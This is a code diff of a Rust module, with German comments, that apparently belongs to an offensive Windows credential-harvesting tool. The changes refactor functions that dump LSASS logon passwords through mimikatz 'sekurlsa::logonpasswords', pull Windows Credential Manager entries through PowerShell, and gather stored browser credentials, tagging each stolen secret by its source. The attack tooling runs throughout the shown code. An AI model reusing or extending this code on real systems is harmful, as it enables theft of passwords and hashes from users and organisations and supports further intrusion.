@@ -3,7 +3,6 @@
 //! Nutzt mimikatz (LSASS-Dump) und PowerShell (Credential Manager, Browser).
 //! Auf Nicht-Windows-Plattformen liefern die Funktionen leere Ergebnisse.
 
-use serde::{Deserialize, Serialize};
 #[cfg(target_os = "windows")]
 use std::process::Stdio;
 #[cfg(target_os = "windows")]
@@ -12,18 +11,9 @@ use tracing::debug;
 #[cfg(any(target_os = "windows", test))]
 use tracing::warn;
 
-use crate::error::WinError;
+pub use kx_core::secret::Secret;
 
-/// Extrahiertes Secret von einem Windows-System.
-#[derive(Debug, Clone, Serialize, Deserialize)]
-pub struct Secret {
-    /// Typ des Secrets (z.B. "credential_manager", "lsass", "browser", "ssh_key").
-    pub secret_type: String,
-    /// Benutzername oder Ziel.
-    pub target: String,
-    /// Passwort oder Hash.
-    pub value: String,
-}
+use crate::error::WinError;
 
 /// Extrahiere Credentials aus dem Windows Credential Manager via PowerShell.
 ///
@@ -45,7 +35,11 @@ pub async fn extract_credential_manager() -> Result<Vec<Secret>, WinError> {
         ConvertTo-Json -InputObject @($results)
     "#;
     let output = run_powershell(script).await?;
-    parse_secrets_from_json(&output)
+    let mut secrets = parse_secrets_from_json(&output)?;
+    for secret in &mut secrets {
+        secret.source = "cmdkey".to_string();
+    }
+    Ok(secrets)
 }
 
 /// Extrahiere LSASS-Credentials via mimikatz.
@@ -53,7 +47,11 @@ pub async fn extract_credential_manager() -> Result<Vec<Secret>, WinError> {
 pub async fn extract_lsass() -> Result<Vec<Secret>, WinError> {
     // mimikatz "sekurlsa::logonpasswords" — erfordert Administrator
     let output = run_mimikatz("sekurlsa::logonpasswords").await?;
-    parse_lsass_output(&output)
+    let mut secrets = parse_lsass_output(&output)?;
+    for secret in &mut secrets {
+        secret.source = "lsass".to_string();
+    }
+    Ok(secrets)
 }
 
 /// Extrahiere Browser-Speicherte Daten (Chrome, Firefox) via PowerShell.
@@ -66,7 +64,11 @@ pub async fn extract_browser_credentials() -> Result<Vec<Secret>, WinError> {
         ConvertTo-Json -InputObject @()
     "#;
     let output = run_powershell(script).await?;
-    parse_secrets_from_json(&output)
+    let mut secrets = parse_secrets_from_json(&output)?;
+    for secret in &mut secrets {
+        secret.source = "browser".to_string();
+    }
+    Ok(secrets)
 }
 
 /// Führe ein PowerShell-Skript aus und liefere die Ausgabe.
